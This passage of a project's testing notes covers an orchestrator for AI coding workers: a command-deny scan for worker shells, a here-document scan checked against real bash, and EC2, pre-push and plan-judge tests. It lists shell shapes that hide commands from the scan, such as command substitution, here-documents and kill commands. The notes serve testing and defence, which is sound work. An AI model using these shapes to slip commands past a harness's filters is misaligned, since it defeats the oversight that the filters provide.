(`LIVE_PROBED`), and barnacle-shaped `pnpm` configs for the negative
controls. Forty-seven components were ablated one at a time against this
file and the four repinned scoped-axis files at #292's merge, and every
ablation fails at least one test (restoring the canonical test fallback
fails 6); the post-merge follow-up's four (the strip running before the
`plan_snapshot` branch, the root cap, the wildcard decline, the `commands`
type guard) were each ablated against this file and fail their own test.
Getting there, every component that left everything green was either removed
as redundant or given its own pin, the pin taken from a live CLI verdict
where one existed (single-quote literalness: `echo 'a|pytest tests/'` ran;
an unquoted substitution keeping its outer command whole: `pytest $(cat k)
tests/` was denied). Four lessons generalise. **(1) Omitted is not
recorded.** `_apply_measured_axes` overwrites only the axes present in a
measurement, so a deferred axis left out would let a conformer's
self-reported "9373 passed" survive into the persisted entry;
`test_docs_only_subtask_defers_tests_end_to_end` has the conformer *lie*,
and asserts the lie is gone. **(2) A deny without a reason produces
`blocked`, not compliance.** Replayed against the incident spec, workers
that only hit the deny returned `blocked` 2/2 (which auto-accept then
drops), and the same workers told why completed 5/5 — so the pairing is
decided in `claude_p` and pinned there for every Bash-capable worker, with
the converse (no notice for an unwidened inspect-only worker) pinned too.
**(3) Two predicates for one rule set drift.** The first version derived the
plan-time strip separately from the deny; review found `-k` selections and
`cd … &&` prefixes kept by one and refused by the other, re-creating the
forced-`blocked` state. One pattern list now feeds both, and
`test_matcher_agrees_with_the_live_cli` holds the matcher to the CLI's
observed verdicts rather than to its own reading of them; all 161 live
verdicts gathered in review replay with no case where the CLI denied and the
unanchored matcher did not (the anchored prescribed check misses 5 of the
117 denials, all here-document, comment or `$'…'` shapes the scan does not
model). **(4) Replace a lossy primitive, don't patch it.** Two rounds of
regex splits each fixed one family of shapes and broke another (operators
alone missed subshells; splitting on brackets after dropping quotes broke
`pytest -k "not (slow)" tests/`); a quote-aware scan ended the cycle, and
its own first versions still needed double-quoted substitutions, the outer
command kept whole, and a fallback for quotes left unbalanced by constructs
it does not model. The same list read WIDE is safe where an over-match drops
one requirement and unsafe where it disables the mechanism, so the
prescribed-command check reads it anchored, a prescribed command is never
stripped or exempted, and a stripped paraphrase of one is resynthesised
exactly.

`tests/test_heredoc_scan_agrees_with_bash.py` (4 test functions, 25 cases;
DESIGN §9 *Post-work conformance*, the forbidden-command scan's
here-document rule; review round 30 isolation H1) is a differential test
against `bash -c` itself, never a list of expected splits: each form runs in
real bash under an empty `PATH`, with `pkill`, `kill`, `pgrep`, `cat` and
`npx` as shell functions that mark what ran, and the scan's verdict
(`_process_kill_hit`, `_forbidden_command_hit`) must be a hit exactly when
bash runs the marked command. Its forms: round 30's twelve that hid a
command bash ran (a `<<` in a comment, in `$((…))` or `((…))`, in a
parameter expansion, an ANSI-C quoted delimiter, a `case` `)` inside a
body's substitution, …), the same shapes nearby, controls that are bodies
bash does read (quoted, unquoted, `<<-`), and the whole-suite scan's forms,
the live 0.43.0 shape among them; `test_the_forms_are_what_bash_says_they_are` checks the forms
themselves against bash, and the one deliberate disagreement is pinned
alone: a body the scan cannot prove (no terminating line) is read as
commands — a false denial, never a missed command. With the commit's
parent's `leerie.py` 7 of the 25 fail; with the rule as this commit had it before
review round 30's fold, 17.

## Pre-push preflight probe

`tests/test_prepush_preflight.py` (25) covers `host_prepush_preflight`, the
run-start probe (DESIGN §6 *Finalization*). Real repos, real hooks, no
stubs — the probe's whole value is running the real gate. Its load-bearing
test is `test_probe_pushes_a_new_ref_so_the_hook_gets_real_stdin`: probing
the already-up-to-date working branch still runs the hook but hands it
**empty stdin** (verified against real git), so a hook that iterates the ref
updates git feeds it exits 0 — a false pass, the worst possible outcome for
a probe whose job is predicting a rejection. Pushing a new ref under
leerie's own namespace reproduces the exact line finalize will produce.
Falsified live: changing the refspec to `"$branch"` fails exactly that test
with rc 0. Paired with `test_probe_creates_no_ref_anywhere` (the property
that makes running a real gate safe) and a launcher-gate parametrization
that **extracts** the preflight block from `leerie` rather than reproducing
it. It also pins the **chain** contract: `chain` backgrounds one `./leerie`
per job against a single shared checkout, so without care every job re-runs
the hook — N concurrent lint/typecheck runs computing one answer, N
identical warnings. The chain arm probes once per WAVE (after the checkout
that establishes the tree those jobs will push from) and hands each child
`LEERIE_SKIP_PREPUSH_PREFLIGHT=1`. Both halves are pinned, and both are
load-bearing: skipping in the children alone removes the check from the
most expensive kind of run, the opposite of the point. `group` is
deliberately exempt — separate repos, separate questions. Two traps in that
arm: its `--no-push` skip must read `_ch_passthrough`, since `NO_PUSH` is
first assigned *after* the chain arm and so does not exist there — the
single-run gate's opt-out silently has no counterpart otherwise. And the
block is **executed** by its tests, not merely string-matched: `bash -n`
catches syntax, not an unbound variable or a bare `"${arr[@]}"` on an empty
array under `set -u`, the same "scanning is not calling" lesson
`test_ec2_bash32_portability.py` records — so `_chain_probe_block()` is
bounded before the fan-out (running the wider extraction would background a
real `./leerie`) and driven against a real repo.

### Three test-side traps (EC2 transport stubs)

Three test-side traps in the same area, all of which made a test pass or
hang while proving nothing: `tests/test_ec2_transport.py::_stub_timeout`
must **kill the process group**, not just the direct child — macOS ships no
`/usr/bin/timeout`, so `_seed_timeout_prefix` correctly no-ops on the
stubbed PATH and a stall test's `sleep 600` runs unbounded (a 10-minute
hang, not a failure); and killing only the child leaves its grandchildren
holding the captured stdout, so a `$(...)` capture blocks until every writer
closes the pipe. Real GNU `timeout` kills the group for exactly this reason.
`tests/test_ec2_seed_repo.py` imports that killing stub for its stall test
rather than its own local `_make_stub_timeout`, which is a no-op passthrough
(fine for tests that just need the binary to exist, useless for one
asserting the cap fires). And its `_make_stub_ssh` rewrite used
`${{a/\/work/$DEST\/work}}` — the replacement half of `${{var/pat/repl}}`
is not a regex and needs no escaping, so the `\/` was a **literal
backslash**: the transfer landed in a directory named `<dest>\`, rsync
exited 0, and the test failed with "untracked.txt missing" and no error
anywhere. Only the pattern half escapes.

## Rebaser marker checkpoint

`tests/test_check_rebaser_worktree_state.py` builds real repos and real
`git worktree add` copies — `.git` is a file there, which is what hid the
old `<worktree>/.git/rebase-merge` probe. Each marker case keeps the line
it guards against:

- `test_rebased_claim_with_divider_rows_passes`: `=====…` divider rows
  (plain-text mailer templates) on both sides of a real rebase. A
  whole-tree `^={7}` grep rejected every rebase in such a repo.
- `test_markers_in_minus_diff_lockfile_fail`: `--check` skips `-diff`
  paths, which merge still writes markers into.
- `test_upstream_setext_heading_passes` / `test_markers_fail_when_base_already_has_a_separator_line`:
  the base-side filter, as a pair. The first fails if the filter is
  dropped; the second fails if it is applied per file rather than per
  line (verified by substituting a "skip files whose base copy has a
  marker-shaped line" filter).
- `test_unresolvable_pre_rebase_sha_fails_closed` /
  `test_unresolvable_rebase_state_fails_closed`: git exiting 128 with
  empty stdout must not read as clean.

`tests/test_run_rebaser.py`'s mismatch case has its fake worker write the
markers, because markers already at the pre-rebase tip are not the
rebase's doing.

## EC2 credential-resolution wiring

The launcher's credential-resolution wiring within that same `RUNTIME=ec2`
branch — sourcing `aws-credentials.sh`, calling `resolve_aws_credentials`,
`eval`ing its `export` lines before `require_aws` runs — is pinned in
`tests/test_ec2_e2e_provision.py` (call-index ordering: an SSO-configured
profile with explicit env-var credentials layered on top resolves via the
env vars, with `require_aws`'s `sts get-caller-identity` the first `aws`
call observed; explicit env credentials win over a fully-configured SSO
profile; `LEERIE_AWS_PROFILE` selects a named profile's static credentials
over `[default]`; an expired SSO cached token aborts non-zero with
`aws-credentials.sh`'s own hint and zero `aws` calls) and in
`tests/test_ec2_launcher_credentials.py`, which closes the one part of the
seam no sibling file exercises: region. `require_aws`'s
`sts get-caller-identity` never passes `--region` — the resolved region
reaches it only via the `AWS_REGION` env var the dispatch block `eval`s —
so this file's stub records the *effective `AWS_REGION` env value* to pin:
`LEERIE_AWS_REGION` (leerie's own knob, distinct from the SDK's
`AWS_REGION`) winning over an ambient `AWS_REGION`; the ambient value
passing through unchanged when unset; and an unresolvable region (no
`AWS_REGION`/`AWS_DEFAULT_REGION`/profile `region` key) aborting non-zero
via `resolve_aws_credentials`'s own die-with-hint before `require_aws`'s
probe ever runs. Also adds a direct argv assertion for `--profile
<resolved>` and a harness-sanity check that it exercises the same
verbatim-extracted dispatch block as `tests/test_ec2_e2e_provision.py`
rather than a hand-copied reproduction.

## EC2 resume path (`ec2-resume-instance.sh`)

The EC2 resume path — `scripts/remote/ec2-resume-instance.sh`'s
`resume_instance()`, the EC2 counterpart to `resume-machine.sh` — is tested
in `tests/test_ec2_resume_instance.py` against the same resource-tracking
`aws` stub: starting a `stopped` instance drives it to `running` via a
single `start-instances` call; the readiness poll does not return early
when a seeded `status_ok: False` keeps `describe-instance-status` reporting
"initializing" (and does return promptly once `status_ok: True`);
`LEERIE_EC2_SSH_TARGET` is re-resolved to the instance's current
`PublicIpAddress` rather than any address cached from provision time (EC2
assigns a new public IP on every stop/start cycle absent an attached
Elastic IP); a full provision → stop → resume round trip leaves exactly one
`running` instance with no leaked volumes; resuming an already-`running`
instance is an idempotent no-op that issues no `start-instances` call;
resuming an unknown/terminated instance fails with the "no longer
recoverable" hint and issues no `start-instances` call; the run.json
sidecar's `paused_at`/`pause_reason` fields are cleared on success; and the
one-way-ratchet invariant (never `terminate-instances` or `delete-volume`)
holds both on the success path and the failure path (instance never becomes
ready), (source-level grep guard).
`tests/ec2_stub.py` gained a reassigning `public_ip` (`_ip_gen` counter) and an optional `status_ok` flag for slow-poll simulation.

## `stop` verb EC2 dispatch

The launcher's `stop` verb EC2 dispatch — the counterpart to
`_auto_detect_fly_runtime` for EC2 runs, DESIGN §6 "Run identifier" — is
tested in `tests/test_ec2_launcher_stop.py` by invoking the real `leerie`
binary (not an extracted block, since `stop` is an early fast-path verb
dispatched before container preflight) against the same resource-tracking
`aws` stub: an `ec2-instance.json` sidecar auto-detects the EC2 runtime and
`stop <run-id>` drives the stub-tracked instance to `stopped` (never
`terminate-instances`) and writes `paused_at`/`pause_reason`/`ec2_instance_id`
onto `run.json`; explicit `--runtime ec2` works without autodetection; the
local/Fly fallthrough error text is unchanged when no sidecar of any kind is
present; `--runtime bogus` is still rejected, now with the `'local', 'fly',
or 'ec2'` wording; a sidecar present but missing `ec2_instance_id` fails
closed with an actionable error rather than silently no-op'ing; and a
failing AWS credential probe aborts before any `aws ec2 ...` call reaches
the stub, leaving the instance `running`.

## Full EC2 dispatch lifecycle (create -> seed -> orchestrate -> teardown)

The `RUNTIME=ec2` dispatch branch continuing past preflight into the full
create -> seed -> orchestrate -> teardown lifecycle (the old `--runtime ec2
preflight passed, but instance provisioning is not yet wired` abort is
gone) is pinned in `tests/test_ec2_launcher_dispatch_e2e.py`, which reuses
(rather than reimplements) `tests/test_ec2_e2e_provision.py`'s
`extract_ec2_dispatch_block`/`run_ec2_dispatch`/`stub_aws_env` harness and
`tests/ec2_stub.py`'s resource-tracking `aws` stub. It
pins: a full launch with valid credentials provisions exactly one instance,
reaches the stubbed `ec2_seed_repo`, and terminates cleanly at
`decide_ec2_teardown`'s clean-exit arm, leaving zero leaked instances and
zero leaked volumes; a grep guard that neither `"not yet wired"` nor the
more specific historical string `"instance provisioning is not yet wired"`
appears anywhere in `leerie`; `require_aws`'s `sts get-caller-identity`
still precedes any `ec2 run-instances` call by call index across the *full*
lifecycle path (not just the provision-only path `test_ec2_e2e_provision.py`
already covers); and a failing credential probe still aborts non-zero with
the `aws sso login --profile <p>` hint and zero tracked resources.

## Run-dir sidecar runtime autodetection

The generalized run-dir sidecar autodetection — `_auto_detect_run_runtime`
(checks `fly-machine.json` then `ec2-instance.json`, echoing the detected
runtime) and the `_auto_detect_fly_runtime` back-compat Fly-only wrapper
built on top of it — is tested in `tests/test_auto_detect_run_runtime.py`.
The first half extracts both functions verbatim from the launcher and
exercises them against fixture run dirs: an ec2-instance.json-only run dir
detects as `ec2`; a fly-machine.json-only run dir still detects as `fly`
(no regression); neither sidecar present returns nonzero with nothing
echoed; an explicit runtime short-circuits detection even when a sidecar
for a different runtime is present; Fly wins when (never expected in
practice) both sidecars co-exist; and the Fly-only wrapper returns
nonzero for an EC2 run.

`finalize`'s **local** arm is covered by eight further end-to-end cases in the
same file. The discriminating one is
`test_finalize_local_run_without_finished_at_reaches_host_finalize`: a run
dir with no Fly/EC2 sidecar and deliberately **no `finished_at`** — the shape
left by a Ctrl-C after the waves integrated but before `phase_finalize`.
Before the local arm existed, `_auto_detect_run_runtime` left `_fin_runtime`
empty, the `_already_synced` probe missed for want of `finished_at`, and the
dispatch chain's bare `else` sent the run into the Fly path, where
`require_flyctl` offered to *install flyctl* for a run that never touched
Fly. `no_push` set in `run.json` alone makes `host_finalize` short-circuit at
its own early gate — a return from *inside* `host_finalize`, which is what
proves the launcher handed off, without the test needing a git remote or a
rebaser worker. No `--no-push` is passed: the verb no longer strips the
record (7de505e2), so the record alone is what the gate reads. The remaining cases pin
`--runtime local` as accepted (it used to `exit 1`), `--force` refused with
the local message rather than the EC2 one, a missing run branch failing
closed on the branch rather than deeper in `host_finalize`, its positive
twin proving the gate PASSES when the branch exists (without which
`create_branch` is inert and nothing distinguishes a real check from a
blanket refusal), a Fly sidecar still promoting to `fly` (the local default
must not swallow a real Fly run), and the advertised usage enum reading
`local|fly|ec2` — asserted through three different rejection paths, so it
checks what a user is shown rather than a source substring. These fixtures point the launcher at a scratch git repo via
its **working directory**, which is the only lever that works: `leerie:39`
assigns `USER_REPO="$(pwd -P)"` unconditionally, so the
`USER_REPO="${USER_REPO:-$PWD}"` at the top of the finalize arm can never fire
and exporting `USER_REPO` has no effect. `tests/ec2_stub.py`'s shared
`run_launcher` grew a `cwd` parameter for this (the idiom
`test_launcher_finalize_no_work.py` already used). Getting it wrong fails
silently rather than loudly — every `git -C "$USER_REPO"` would run against
the leerie checkout pytest was started from, where the fixture's run branch
does not exist, so the branch-dependent assertions would pass for the wrong
reason. `test_finalize_local_branch_gate_is_scoped_to_the_launcher_cwd` pins
the plumbing with two sources that disagree. Note the
local-shaped fixtures in `tests/test_launcher_finalize_no_work.py` cannot
catch this regression: all of them exit early through `_already_synced` /
`pushed_at` / argv validation and never reach the runtime dispatch.

The second half invokes the real launcher end to
end (mirroring
`tests/test_accept_blocked.py`'s local-path pattern) across `stop`,
`kill`, `accept-blocked`, and `finalize`: each accepts `ec2`
alongside `local`/`fly` in its `--runtime` enum validation (rejects other
bogus values with the updated three-way message). No verb fails closed on
EC2 any more: `finalize` and `resume` now promote to `ec2` and enter their
EC2 arms (covered end to end by `tests/test_ec2_launcher_finalize.py` and
`tests/test_ec2_launcher_resume.py`), so this file's three EC2 cases assert
the *promotion* plus an arm-specific failure — never the retired blanket
refusal. `resume` is the one verb here that does not exit promptly after
detection (it falls through into the launch path's unconditional container
image build), so its case captures stderr on timeout rather than waiting;
the Fly auto-detect regression path (no
sidecar override, `LEERIE_FLY_APP` unset) still reaches the pre-existing
Fly-specific error, proving detection promoted to `fly` and reached the
Fly branch. `stop` and `kill` both wire real EC2 actions (test-001 and
feat-006 respectively — see `tests/test_ec2_launcher_stop.py` and
`tests/test_ec2_launcher_kill.py` above/below for their end-to-end
coverage): passing `--runtime ec2` against a run dir with no
`ec2_instance_id` anywhere dies with "no ec2_instance_id found" instead of
the old fail-closed message, and auto-detecting the `ec2-instance.json`
sidecar proceeds past detection into AWS credential resolution (which
fails in this test's env for unrelated reasons — no `aws` binary/credentials
set up) rather than hitting the old fail-closed message. `resume` is
covered separately: an `ec2-instance.json` sidecar fails closed with a
resume-specific message instead of promoting `RUNTIME=ec2` (which would
otherwise fall into the launcher's fresh-provision `RUNTIME=ec2` branch and
die with an unrelated "not yet wired" message), while a `fly-machine.json`
sidecar still promotes to `fly` as before. Neither `accept-blocked` nor
`finalize` wire an EC2 verb *action* yet — that is feat-007/feat-008 (and
a later `resume` subtask); this subtask's scope for those two remains the
detection helper and the `--runtime` enum validation it feeds.

## EC2 `kill` action ordering

`kill`'s EC2 action — resolving `ec2_instance_id` from the run dir,
resolving AWS credentials, re-resolving `LEERIE_EC2_SSH_TARGET`, and
syncing state via `_try_fetch_state_for_ec2_teardown` BEFORE calling
`terminate_instance()` (the one-way-ratchet invariant
`ec2-provision.sh:262-272` documents) — is tested end to end in
`tests/test_ec2_launcher_kill.py` against the real `leerie` launcher
binary. Remote commands go over the `ssh` stub (the transport
`ec2_remote_exec`/`fetch_state_ec2` use), which execs them locally against
a real git repo standing in for the instance's `/work` (reusing
`tests/test_ec2_fetch_branch.py`'s `_make_stub_ssh`/
`_init_instance_repo_with_run`/`_setup_instance` helpers directly rather
than reimplementing them, so `fetch_state_ec2` runs for real instead of
being hand-waved), while `sts`/`ec2 <action>` route to
`tests/ec2_stub.py`'s resource-tracking state machine (imported and
reused as the lifecycle backend) so credential/instance-lifecycle calls
are tracked too — both halves append to the same `aws.log`/`state.json`
so `tests/ec2_stub.py`'s `read_log`/`read_state`/`leaked_resources` work
unmodified; a thin wrapper logs every ssh call into the same `aws.log`.
Pinned: every fetch-step ssh call (including the bundle download) precedes
`terminate-instances` by call index (falsified live — reordering the
launcher's fetch/terminate calls makes this test fail, since
`terminate_instance()` clears `LEERIE_EC2_INSTANCE_ID` and the
now-preceding fetch step then errors on a missing instance id); a
successful kill leaves zero non-terminated instances and zero leaked
volumes in the stub's tracked state; a failed fetch (no completed run
committed on the "instance" side, so `fetch_state_ec2`'s discovery step
fails closed) leaves the instance `running` rather than escalating to
termination; a hard-failing `flyctl` stub (records invocation, exits
nonzero) is on PATH throughout and its log stays empty on every path,
pinning that an EC2 run-id is never handed to `flyctl`; `run.json` gets
`killed_at` + `ec2_instance_id` on success, bootstrapped from
`ec2-instance.json` via the widened `_ensure_run_json` when `run.json`
doesn't exist yet; a sidecar with no resolvable `ec2_instance_id` dies
with "no ec2_instance_id found" without ever calling `terminate-instances`
or `flyctl`; and the confirmation prompt (bypassed by `--force`, same
convention as the Fly/local `kill` paths) rejects a wrong confirmation
and proceeds on the correct one.

## Plan-overlap judge: multi-drop clusters

The phase 2¾ plan-overlap judge (DESIGN §5 *Cross-domain surface overlap*)
is tested in `tests/test_phase_overlap_judge.py`. Beyond the schema and
merge-feasibility backstop, it pins the **multi-drop cluster** contract
(DESIGN §5 *Multi-drop*): one sid dropped by 2+ collisions is coherent
judge output — the prompt explicitly instructs it — and must not `die()`.
The load-bearing pin is `test_apply_multi_drop_preserves_both_survivors`:
replaying such a cluster pairwise through the apply loop's transitive
`survivor_of` rewrite silently deletes a **live** subtask the judge never
named (pair 2's `_resolve` maps the already-dropped endpoint onto pair 1's
survivor), fabricating a supersedure claim between two subtasks never
compared; `_apply_overlap_drop` discards title/intent/success_criteria by
design, so the loss is unrecoverable and compounds —
`test_apply_multi_drop_three_way` pins that the pre-fix loop destroys
three of four subtasks. Chasing `survivor_of` is safe for a `merge`
(intent carries forward) and never safe for a `drop`. Also pinned: the
three-tier cycle ladder (`multi_drop_fanout` →
`multi_drop_degraded_single` → `skipped_would_cycle`), since the fan-out
*adds* graph edges and can close a cycle no individual pair would;
sorted-survivor determinism at both the cluster-collection and
`_apply_multidrop` layers (`_schedule()` is documented deterministic, so
the plan must not depend on judge emission order); that a *legitimate*
transitive chain still applies both drops (the guard must not
over-suppress); and — previously **entirely unpinned**, the
highest-severity silent-disable in the phase —
`test_phase_overlap_judge_dies_on_unresolvable`, without which two
implementers ship incompatible APIs against one artifact and it surfaces
at integration with no trace back to phase 2¾. Two mutants in this
region are **equivalent** and deliberately left unkilled, documented in
the tests that would otherwise appear to cover them: `_resolve`'s `while`
vs `if` (path compression flattens the map before the second hop) and
`_apply_multidrop`'s `s != dropped_sid` filter (the removal loop runs
before anything reads survivors). Do not "strengthen" those tests
chasing a mutant that cannot be killed. `PHANTOM_ARTIFACT` resolves a
collision's artifact against the plan's `files_likely_touched` as well as
the working tree — two planners that both *create* the same file is the
judge's canonical collision, so a tree-only existence test rejects the
primary case — via a shared `_normalize_artifact_path` that
`NO_FILE_OVERLAP` also uses (both sides are planner-authored strings, so
`./x` and `x` must not read as disjoint; no case folding, since container
checkouts are case-sensitive).

## Plan-overlap judge: multi-artifact pairs

The same file also covers the **multi-artifact pair** contract (DESIGN §5
*Multi-artifact pair*) and the `artifact`-is-a-logical-name rule, both
added after run `e2882da6…` (2026-08-01) died in phase 2¾ having written
no code. `check_overlap_judge_output` treated any `artifact` containing
`/` as a bare path, so the descriptive names the prompt actually asks for
(`docs/USAGE.md bare-verb rewrite`) read as hallucinated files — 6
spurious `PHANTOM_ARTIFACT` issues on an emission that replays clean. The
retry those issues forced then expressed one pair's two-file overlap as
two rows, which the bare pair-repetition gate refused. `artifact` is now a
prose **label** Python never parses: the judge names the files in an
`artifact_paths` array and `PHANTOM_ARTIFACT` does set membership
on that (CLAUDE.md *Language-to-JSON* — never hand-parse an LLM's
response). That array is **asked for but no longer `required`** (changed
2026-08-03): requiring it proved far more destructive than the false positives
it prevented — `plan_overlap_judge` produced valid output on only 40.9% of its
corpus invocations (27/66) against 99.6–100% for every other worker, and 84 of
its 85 validation failures were the lone error `'artifact_paths' is a required
property`. Absence was already the designed-for case (`if not paths:
continue`), so the requirement bought no verification and turned a graceful
skip into a discarded plan. Pinned by `TestProsePathParsingAbsent`: `_depunctuate` /
`_path_shaped` are gone, the check calls no `.split()`/`.strip()` on
`artifact`, the schema requires the field with `minLength: 1` items, and
the prompt actively asks the judge to fill it — a pathless collision
silently disables the check, and 84% of the 64 collisions ever emitted
carry a path. The behavioural pair is
`test_prose_in_artifact_is_never_parsed_for_paths`: the same invented path
must be invisible in the label and flagged in the field, so neither half
can pass vacuously.

## Plan-overlap judge: duplicate collision resolution

For duplicates, what must agree is the resolved **effect**
(`_collision_effect`: dropped sid, or unordered merge pair) — never the
`resolution` string, since swapped-endpoint `drop_a` rows share a string
and delete opposite subtasks. A 4×3 parametrized matrix freezes the
composition of the three gates involved: every effect-differing shape is
terminal (via the pre-existing `_contradictory_drop_sids` keep-and-delete
gate — on a two-sid pair any effect difference makes one sid both dropped
and surviving, which is *why* relaxing the pair check opened no hole),
every effect-identical shape coalesces to one row keeping all artifacts,
and each conflicting shape is offered a `DUPLICATE_PAIR` retry round
first. A separate test pins that the `DUPLICATE_PAIR` string keeps the
`LABEL: subject — detail` shape, since `_issue_signature` splits on the
first em dash and the row count must not perturb the oscillation key.

## Wiring gate: resume must not bypass it

`resume` must not bypass the phase-3 semantic wiring gate
(`tests/test_wiring_gate_resume.py`). `phase_wiring_gate` is
detect-and-die, and its skip-on-resume used to key on `plan_snapshot` —
which is written *earlier*, deliberately, so a die() at either terminal
gate does not discard the planning spend. The snapshot is therefore
present even when the gate FAILED, so a resume skipped the whole branch,
never re-invoked the gate, and executed the plan the gate had rejected —
while the die() message claimed the gate had "no bypass flag" (run
`3a4abba3…`, 2026-08-01: verified to reach `phase_execute` with zero gate
invocations). The skip is now keyed on `st.data["wiring_gate"]`, written
only on a clean pass. All three shapes are pinned behaviorally against the
real `_run_phases` with every phase stubbed and counted (reusing
`tests/test_resume_planning_reentry.py`'s harness): gate-died → re-runs,
fresh run → runs (the anti-vacuity control), gate-passed → skips, so the
budget-check resume this branch exists for stays cheap. A `WorkerError`
degrade writes nothing, so it re-attempts rather than inheriting a verdict
never reached. Two source-coupling guards pin the structure the stubs
cannot see: the call sits behind its own `wiring_gate`-keyed guard
*outside* the `plan_snapshot` if/else, and the die() text states that
`resume` re-runs it.
`tests/test_phase_wiring_gate.py`'s
`test_wiring_gate_is_not_re_invoked_on_budget_check_resume` was rewritten
in the same change — it previously pinned the old structure by source
order (gate call between the snapshot write and the `else:`); it now pins
the audit-key guard while asserting the same cheap-resume property.

## Wiring gate: constrained auto-repair

The wiring gate's **constrained auto-repair** (DESIGN §5 *A wiring re-check on
the fully-merged plan*) is pinned in `tests/test_wiring_gate_repair.py`. The
commonest defect the `wiring_judge` finds is one no planner could have
avoided: planners run blind, so a subtask in domain X cannot declare a
`requires` on a tag domain Y's planner has not invented yet, and
`phase_reconcile`'s charter is *declared-but-unmatched* tags — a subtask that
declared nothing never enters its `unresolved_requires` input. Measured across
the corpus (2026-08-01), **6 of the 9 runs that ever reached this gate died at
it**. `_repair_missing_requires` adds an edge only when the defect is
`missing_requires`, the sid is in the plan, `tag_or_dep` is non-empty (the
schema carries no `minLength`, and a subtask declaring `provides: [""]` would
otherwise make the tag channel synthesize a meaningless empty-tag edge), the
edge is not already declared, and it leaves the graph acyclic.

Given that, **`tag_or_dep` is resolved against BOTH dependency channels** —
the field name is literal, and the judge fills it with either. First match
wins, tag first, so pre-existing behavior is unchanged: **(a) tag** — exactly
one in-plan provider that is not the sid → append an in-plan `requires`;
**(b) id** — a surviving subtask id that is not the sid → append a
`depends_on`, unambiguous by construction since an id names exactly one
subtask; **(c) single-cluster fan-out** — several providers that all share one
`_cofile_cluster` → append the `requires` tag, because those providers are the
sub-file region splits of ONE file (§5½ (P1)) and requiring the tag orders the
subtask behind the whole cluster. Each repair records a `channel`.

Reading only the tag channel was the original shape (PR #145) and was the
dominant refusal cause: **23 of the 24 defects refused as "no in-plan
provider" named a surviving subtask id**, and run `62a19deb` died with 22
defects of which every one was that shape; a second run's refusals were one
tag with eleven providers that were all one cluster. Closing both channels
took the corpus from 19/27 to 21/27 runs clearing the gate and from 35/63 to
9/63 unrepaired defects — and the repair now resolves **5 of those 6** historic
deaths rather than 3. The residual refusals are genuine: a `tag_or_dep` that
is neither a surviving id nor a provided tag means the plan lacks the *work*,
not the edge.

Pinned: the incident shape repairs and reschedules producers strictly before
the consumer (with an anti-vacuity control that the *un*repaired plan races
them); a value that is neither a provided tag nor a subtask id declines;
providers spanning *different* clusters decline
(`test_multiple_providers_in_different_clusters_declines`), while one shared
cluster repairs; the id channel declines a self-reference and respects the
same cycle guard; the tag channel wins when a value is both a tag and an id; a
non-`missing_requires` kind, an unknown sid, an empty `tag_or_dep`, and a
self-provider all decline; an already-declared edge is neither repaired nor
gating (on both channels).

## Wiring gate: dismissing provably-false defects

**The already-declared guard is channel-local AND sits downstream of channel
selection**, so a defect matching no channel takes the `else: unrepaired;
continue` arm and never reaches `tag in declared` — the guard is structurally
dead on the only path that reaches the `die()`. Run `05fdffb8…` (navegando)
died there on a finding that was false as written: `test-003` already declared
`requires: action-echoed-row-payload`, the very tag reported missing, which
orders it behind *every* provider — but the tag's two providers spanned
clusters, so no channel matched and the whole planning spend was lost on a gate
with no bypass flag. `_filter_defects_already_ordered(plans, defects) ->
(surviving, notes)` re-checks the residual after the repair loop (same return
shape as its pre-repair sibling `_filter_provably_false_wiring_defects`; notes
route into the existing `already` log line). Three properties are load-bearing
and each has its own killing test. **(a)** Ordering resolves through
`_build_predecessor_graph`, not `depends_on` — the same reason
`_would_cycle_after` routes through it — because `requires` entries with
`extent: in_plan` create edges too and **99 of 535 direct corpus orderings (19%)
exist only through that channel**; `test_ordered_via_an_in_plan_requires_tag_is_also_dismissed`
fails against a `depends_on`-only check, and
`test_requires_with_a_NON_in_plan_extent_still_gates` is the sharp control
separating "used the real helper" from "loosely scanned the requires array".
**(b)** *Every* producer must precede the sid, never any one:
`test_ordered_behind_only_SOME_producers_still_gates` — dismissing on `&` waves
through the exact race the gate exists to catch, strictly worse than the
over-gating being fixed — plus `test_a_capability_nothing_provides_still_gates`,
since `set() <= anything` is vacuously True and an unguarded subset test
dismisses the canonical TRUE finding (that mutation kills 7 tests, 5 of them
pre-existing). **(c)** Direct edges only, never the transitive closure (a
further 127 corpus orderings hold only transitively):
`test_ordering_that_holds_only_TRANSITIVELY_still_gates` pins the scope as a
decision, not an accident. **The pass is scoped to `kind ==
"missing_requires"`** — the repair loop routes every non-repairable defect to
the same residual, so `broken_by_drop`/`broken_by_merge` reach it too, and
ordering cannot refute those (they assert the *work* is gone; scheduling behind
a subtask does not restore a capability it no longer provides). The upstream
`_filter_provably_false_wiring_defects` does not backstop it — that predicate
fires only when the named *capability* is still provided, and a `tag_or_dep`
naming a surviving subtask id is not a tag, which was measured dismissing a
`broken_by_drop` before the guard existed
(`test_broken_by_drop_is_not_dismissed_on_ordering`, with
`test_the_same_shape_as_missing_requires_IS_dismissed` as the byte-identical
positive control so the guard cannot pass by disabling the pass wholesale).
The pass emits its own log line rather than reusing the per-channel `already`
wording, since two of its three dismissal shapes are not an edge the subtask
declares; both messages are pinned in `TestDismissalIsVisible`. The pass runs after the repairs rather than before
because a residual can also be mooted by an edge a *sibling* defect's repair
added and emission order is arbitrary — `test_order_independent` emits the
survivor FIRST, which a pre-filter cannot dismiss. Provably inert on the pinned
corpus (0 unrepaired defects across all 6 runs, so
`test_wiring_repair_corpus.py`'s counts cannot move). The cycle
guard has its own group because it is load-bearing rather than defensive — a
well-formed but WRONG edge was measured closing a cycle across an entire plan,
so `test_plan_still_schedules_after_a_skipped_cycle` asserts both that the
skipped edge leaves a schedulable plan AND that force-applying it makes
`_schedule()` die; `test_cycle_trials_are_cumulative` pins that trials run
against the plan as already mutated, so individually-safe edges cannot combine
into a cycle. Two source-coupling guards close the loop: `_run_phases` must
re-run `_schedule()` and rewrite `plan_snapshot` when repairs land (otherwise
the budget preflight, `check_plan_wiring`, `_validate_plan` and `_write_plan` all
see the pre-repair wave partition), and the `die()` must precede the
`st.data["wiring_gate"]` write so a failing gate leaves no key for `resume`
to skip on. **Note:** widening
`_warn_test_subtask_missing_producer_edge` past its `test-` prefix was tried in
the same change and reverted — it does not catch this class. Run 6146bd2f's
under-wired subtask declared 3 `requires` and 3 `depends_on`; it was missing
four *specific* edges, not all of them, so the advisory's both-empty condition
never held regardless of prefix. Widening only added noise by flagging
legitimate root producers.

## Wiring gate repair: corpus-measured effect

The repair's *measured effect* — as opposed to its per-rule behavior — is
locked separately in `tests/test_wiring_repair_corpus.py` against
`tests/fixtures/wiring_repair_corpus/corpus.json`, the real recorded
